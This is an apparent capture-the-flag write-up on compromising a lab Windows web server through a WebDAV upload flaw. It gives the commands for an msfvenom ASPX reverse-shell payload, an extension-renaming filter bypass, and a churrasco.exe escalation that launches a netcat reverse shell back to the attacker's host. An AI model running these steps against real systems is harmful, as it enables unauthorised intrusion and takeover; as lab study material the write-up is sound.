## Reconnaissance

The engagement began with a port scan against the target. Only port 80 is open, serving an HTTP service. Subdirectory and subdomain brute forcing add no further attack surface.

With service-version detection (**-sV**), the server is shown to accept HTTP POST requests, which suggests file-upload capability. To confirm it, davtest is run to check for WebDAV misconfigurations.

```bash
davtest -url http://10.10.10.15
```

![davtest results](/assets/images/granny/93-1.png)
*davtest probing the WebDAV configuration*

The output confirms that several file types can be uploaded successfully.

## Exploitation

A reverse-shell payload is generated with msfvenom in ASPX format.

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=<IP> LPORT=4444 -o shell.aspx
```

To get past the upload filter, the extension is changed from ASPX to TXT before uploading.

```bash
mv shell.aspx shell.txt
```

CADAVER is then used to talk to the WebDAV service and upload the payload, after which it is renamed back to ASPX so the server will execute it.

![Uploading the payload with CADAVER](/assets/images/granny/93-2.png)
*Interacting with WebDAV through CADAVER*

![Payload uploaded](/assets/images/granny/93-3.png)
*The renamed payload placed on the server*

Browsing to the uploaded file returns a reverse shell. The shell runs with low privileges, so `systeminfo` is used to read the OS version and look for escalation vectors.

![systeminfo output](/assets/images/granny/93-4.png)
*Enumerating the OS version for escalation paths*

## Privilege Escalation

The system details point to Token Kidnapping local privilege escalation, which allows running commands with administrative privileges.

The escalation binary is uploaded to the server, again renaming the extension to bypass the filter.

![Escalation binary uploaded](/assets/images/granny/93-5.png)
*Uploading the privilege-escalation binary*

![Binary in place](/assets/images/granny/93-6.png)
*The binary staged on the target*

Netcat is uploaded as well, to launch a new elevated reverse shell.

![Netcat uploaded](/assets/images/granny/93-7.png)
*Uploading Netcat for the elevated callback*

Finally, the escalation binary runs Netcat as administrator, spawning an elevated reverse shell.

```bash
C:\Inetpub\wwwroot>churrasco.exe -d "\inetpub\wwwroot\nc.exe -e cmd.exe <IP> 1234"
```

This yields an administrative shell and completes the compromise.

![Administrative shell obtained](/assets/images/granny/93-8.png)
*Elevated reverse shell as administrator*
